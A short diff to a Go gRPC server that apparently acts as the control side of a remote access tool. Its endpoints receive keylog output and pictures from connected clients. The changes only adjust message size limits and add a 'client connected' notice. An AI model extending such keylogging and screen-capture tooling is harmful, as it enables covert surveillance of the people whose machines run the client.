@@ -90,7 +90,7 @@ func main() {
 		log.Fatalln(err)
 	}
 
-	s := grpc.NewServer(grpc.Creds(creds), grpc.MaxRecvMsgSize(6000000*1024), grpc.MaxSendMsgSize(6000000*1024))
+	s := grpc.NewServer(grpc.Creds(creds), grpc.MaxRecvMsgSize(6000000*48), grpc.MaxSendMsgSize(6000000*48))
 	lis, err := net.Listen("tcp", ":8000")
 	if err != nil {
 		log.Fatalf("Failed to listen: %v", err)
@@ -292,6 +292,7 @@ func (s *server) SetKeylogOutput(ctx context.Context, in *pb.KeylogOutput) (*pb.
 func (s *server) GetPicture(ctx context.Context, in *pb.ClientDataRequest) (*pb.PictureData, error) {
 	if !Contains(client_ids, in.ClientId) {
 		client_ids = append(client_ids, in.ClientId)
+		header = color.GreenString("Client connected with id %s", in.ClientId)
 	}
 
 	if in.ClientId == current_id {
